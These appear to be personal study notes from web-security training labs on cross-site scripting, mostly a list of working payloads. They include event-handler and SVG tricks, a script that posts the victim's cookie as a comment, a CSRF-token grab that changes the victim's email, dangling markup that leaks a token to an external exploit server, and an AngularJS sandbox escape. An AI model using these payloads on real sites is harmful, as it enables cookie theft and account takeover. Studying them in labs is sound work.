A `<script>` tag inserted with `innerHTML` will not execute.

jQuery selector vulnerability: (recent version has fixed this)
`var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');`
this will always result in creating a new node in the background of the DOM when a node is passed to the `contains` method

Auto foucs: use fragment `#x`

    <my-tag id='x' onfocus=alert() tabindex=0></my-tag>

Accesskey: add this attribute `accesskey='x' onclick=alert()`
- On Windows: `ALT+SHIFT+X`
- On MacOS: `CTRL+ALT+X`
- On Linux: `Alt+X`

The closing tag inside quotes will be treated as HTML entity not a string, therefore this will be executed:

    <script>var x = 'hello</script>'

Bypass single/double quotes and backslash escape using HTML encoding and take advantage of Javascript precedence:

    <a href="http://aha?'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http:/aha?&apos;-alert(1)-&apos;');">avvv</a>

Consider `x = 'http:/aha?' - alert(1) - ''` -> `alert(1)` will be executed first and then return undefined, `'http:/aha?'` will be converted to a number but since it's not a valid number, it would be NaN -> x = NaN

Make the victim post the comment showing it's cookie:

    <form
      id="my-form"
      action="/post/comment"
      method="POST"
      enctype="application/x-www-form-urlencoded"
    >
      <input type="hidden" name="postId" value="4" />
      <input type="hidden" name="comment" id="cmt" />
      <input type="hidden" name="csrf" id="csrf" />
      <input type="hidden" name="name" value="victim" />
      <input type="hidden" name="email" value="haha@gmai.com" />
      <input type="hidden" name="website" value="http://ahav.com" />
    </form>
    <script>
      setTimeout(() => {
        originalCsrf = document.getElementsByName("csrf")[1];

        myform = document.getElementById("my-form");
        comment = document.getElementById("cmt");
        csrf = document.getElementById("csrf");
        comment.value = document.cookie;
        csrf.value = originalCsrf.value;
        myform.submit();
      }, 1000);
    </script>

Create script to silmutanously getting the csrf value and sending the change-email request:

    <script>
      var req = new XMLHttpRequest();
      req.onload = send;
      req.open("get", "/my-account", true);
      req.send();
      function send() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
      }
    </script>

Use `<svg>` with `<animate>` to set attribute to `<a>` tag

    <svg>
        <a>
            <animate attributeName="href" values="javascript:alert(1)" />
            <text x="20" y="20">Click me</text>
        </a>
    </svg>

Inject `script-src-elem 'unsafe-inline` to allow the execution of inline script

Dangling markup attack to steal CSRF token:
when the CSRF token is below the place where dangling markup attack could occur, use this to send the CSRF to a listening server
`<a href='https://exploit-0aed003e03a2984d80fa02d801000015.exploit-server.net/exploit?`
This will make a GET request to the server with the parameter containing the CSRF token.

### LAB: Reflected XSS with AngularJS sandbox escape without strings

    toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

**Execution Chain:**
| **Step** | **What Happens?** |
|----------|------------------|
| **1** | `charAt` is modified to `[].join`, enabling further manipulation. |
| **2** | `fromCharCode()` constructs `"x=alert(1)"` dynamically. |
| **3** | `orderBy` evaluates `"x=alert(1)"=1`, which executes `alert(1)`. |
| **4** | **XSS is triggered**. |
